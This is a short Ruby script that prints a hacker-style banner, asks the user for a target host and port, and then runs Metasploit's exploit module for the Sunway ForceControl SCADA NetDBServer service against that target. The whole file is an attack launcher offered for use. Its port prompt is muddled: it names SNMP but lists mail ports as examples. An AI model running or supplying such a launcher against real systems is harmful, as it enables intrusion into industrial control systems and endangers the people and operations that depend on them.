require 'colorize'
puts """
      Th3 M4d_Sc13nT15t is here to stay...

  We trust you have received teh usual lecture
      from the local System Administrator. 

 It usually boils down to these three things:
		#1) Respect the privacy of others.
		#2) Think before you type.
		#3) With great poewr comes great responsibility.""".white
puts """
     Sunway Forcecontrol SNMP 
   NetDBServer.exe Opcode 0x57

           Windows
""".red
puts """
	 1st Try {set RPORT 2381; 2nd RPORT 2001}""".white


puts " [?] What is the target? "
print "[!] --->"
target = gets.chomp

puts " [?] Which SNMP server port (e.g. 25, 465, 587, 2525)? "
print " [!] ---> "
port = gets.chomp




exec("msfconsole -x 'use exploit/windows/scada/sunway_force_control_netdbsrv' -x 'setg RHOST #{target}' -x 'setg RPORT #{port}' -x 'run'")

